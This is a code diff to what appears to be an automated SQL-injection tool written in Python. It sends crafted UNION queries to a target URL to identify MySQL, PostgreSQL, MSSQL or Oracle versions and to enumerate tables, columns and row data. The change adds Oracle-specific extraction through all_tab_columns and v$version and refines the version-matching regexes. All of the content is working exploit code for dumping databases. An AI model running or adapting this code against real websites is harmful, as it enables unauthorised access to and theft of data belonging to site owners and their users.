@@ -45,7 +45,6 @@ def figure_sting_columns(url, num_col):
 def figure_DB_version(url, sql_payload):
     isOracle = False
     res_before = requests.get(url)
-    print("Hi from fig DB version sql payload is : {}".format(sql_payload))
     # Info for Detection for MsSQL , MYSQL
     inj_query = str(sql_payload).replace('\'TestSQLinj\'', '@@version')
     inj_url = url + inj_query
@@ -58,21 +57,21 @@ def figure_DB_version(url, sql_payload):
 
     if res_after.status_code == 200:
         cleand_after_res = str(remove_tags(res_after))
-        databases_version = re.search("PostgreSQL.*|ubuntu.*|MySQL.*|Oracle .*", cleand_after_res)
+        databases_version = re.search("[0-9].*ubuntu[0-9].*|MySQL.*[0-9]|SQL.*[1-9].*", cleand_after_res)
         return databases_version, isOracle
+
     elif res_after_PostgreSQL.status_code == 200:
         cleand_after_res_PostgreSQL = str(remove_tags(res_after_PostgreSQL))
-        databases_version = re.search("PostgreSQL.*|ubuntu.*|MySQL.*|Oracle .*", cleand_after_res_PostgreSQL)
+        databases_version = re.search("PostgreSQL [0-9].*[0-9]", cleand_after_res_PostgreSQL)
         return databases_version, isOracle
+
     else:
         isOracle = True
-        inj_query_Oracle = str(sql_payload).replace('\'TestSQLinj\'', 'banner').replace('from dual-- -',
-                                                                                        'FROM v$version -- -')
-        print(inj_query_Oracle)
+        inj_query_Oracle = str(sql_payload).replace('\'TestSQLinj\'', 'banner').replace('from dual-- -', 'FROM v$version -- -')
         inj_url_Oracle = url + inj_query_Oracle
         res_after_Oracle = requests.get(inj_url_Oracle)
         cleand_after_res_oracle = str(remove_tags(res_after_Oracle))
-        databases_version = re.search("PostgreSQL.*|ubuntu.*|MySQL.*|Oracle .*", cleand_after_res_oracle)
+        databases_version = re.search("Oracle Database [0-9].*[0-9]", cleand_after_res_oracle)
         return databases_version, isOracle
 
 
@@ -84,7 +83,6 @@ def figure_tables_in_DB(url, sql_payload, isOracle):
         inj_tables_schema = str(sql_payload).replace('from dual-- -', 'from all_tables-- -')
         inj_query_Oracle = str(inj_tables_schema).replace('\'TestSQLinj\'', 'table_name')
         inj_url_Oracle = url + inj_query_Oracle
-        print(inj_url_Oracle)
         res_after_Oracle = requests.get(inj_url_Oracle)
         cleand_after_res = remove_tags(res_after_Oracle).split()
         cleand_before_res = remove_tags(res_before_oracle).split()
@@ -102,7 +100,6 @@ def figure_tables_in_DB(url, sql_payload, isOracle):
         inj_query = str(sql_payload).replace('\'TestSQLinj\'', 'table_name').strip(
             '-- -') + ' FROM information_schema.tables-- -'
         inj_url = url + inj_query
-        print(inj_url)
         res_after = requests.get(inj_url)
         cleand_after_res = remove_tags(res_after).split()
         cleand_before_res = remove_tags(res_before).split()
@@ -118,33 +115,58 @@ def figure_tables_in_DB(url, sql_payload, isOracle):
 
 # return list of columns in specific table
 # function used in: step(b-2)
-def figure_columns_in_table(url, sql_payload, table_name):
-    res_before = requests.get(url)
-    extract_query = ' FROM information_schema.columns WHERE table_name=\'{}\'--'.format(table_name)
-    inj_query = str(sql_payload).replace('\'TestSQLinj\'', 'column_name').strip('--') + extract_query
-    inj_url = url + inj_query
-    res_after = requests.get(inj_url)
-    cleand_after_res = remove_tags(res_after).split()
-    cleand_before_res = remove_tags(res_before).split()
-    diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
-    reserved_words.append('\'{}\'--'.format(table_name))
-    reserved_words.append('table_name=\'{}\'--'.format(table_name))
-    new_diff_in_responses = []
-    for i in diff_in_responses:
-        if i not in reserved_words:
-            cleantext = re.sub(cleaner_regex, '', i)
-            if cleantext != '':
-                new_diff_in_responses.append(cleantext)
-    return new_diff_in_responses
+def figure_columns_in_table(url, sql_payload, table_name, isOracle):
+    if isOracle:
+        res_before = requests.get(url)
+        extract_query = ' FROM all_tab_columns WHERE table_name=\'{}\'-- -'.format(table_name)
+        inj_query_schema = str(sql_payload).replace('from dual', '')
+        inj_query = str(inj_query_schema).replace('\'TestSQLinj\'', 'column_name').strip('-- -') + extract_query
+        inj_url = url + inj_query
+        res_after = requests.get(inj_url)
+        cleand_after_res = remove_tags(res_after).split()
+        cleand_before_res = remove_tags(res_before).split()
+        diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
+        reserved_words.append('\'{}\'--'.format(table_name))
+        reserved_words.append('table_name=\'{}\'-- -'.format(table_name))
+        new_diff_in_responses = []
+        for i in diff_in_responses:
+            if i not in reserved_words:
+                cleantext = re.sub(cleaner_regex, '', i)
+                if cleantext != '':
+                    new_diff_in_responses.append(cleantext)
+        return new_diff_in_responses
+    else:
+        res_before = requests.get(url)
+        extract_query = ' FROM information_schema.columns WHERE table_name=\'{}\'-- -'.format(table_name)
+        inj_query = str(sql_payload).replace('\'TestSQLinj\'', 'column_name').strip('-- -') + extract_query
+        inj_url = url + inj_query
+        print(inj_url)
+        res_after = requests.get(inj_url)
+        cleand_after_res = remove_tags(res_after).split()
+        cleand_before_res = remove_tags(res_before).split()
+        diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
+        reserved_words.append('\'{}\'--'.format(table_name))
+        reserved_words.append('table_name=\'{}\'-- -'.format(table_name))
+        new_diff_in_responses = []
+        for i in diff_in_responses:
+            if i not in reserved_words:
+                cleantext = re.sub(cleaner_regex, '', i)
+                if cleantext != '':
+                    new_diff_in_responses.append(cleantext)
+        return new_diff_in_responses
 
 
 # return data in selected columns
 # function used in: step(c-2)
 def figure_data_in_columns(url, sql_payload, table_name, column_name):
     res_before = requests.get(url)
-    extract_query = ' FROM {}--'.format(table_name)
-    inj_query = str(sql_payload).replace('\'TestSQLinj\'', column_name).strip('--') + extract_query
-    inj_url = url + inj_query
+    inj_query = str(sql_payload).strip('-- -')
+    inj_query = str(inj_query).replace(' from dual', '')
+    extract_query = ' FROM {}-- -'.format(table_name)
+    inj_query_1 = str(inj_query).replace('\'TestSQLinj\'', column_name)
+    inj_query_2 = inj_query_1 + extract_query
+    inj_url = url + inj_query_2
+    print(inj_url)
     res_after = requests.get(inj_url)
     cleand_after_res = remove_tags(res_after).split()
     cleand_before_res = remove_tags(res_before).split()
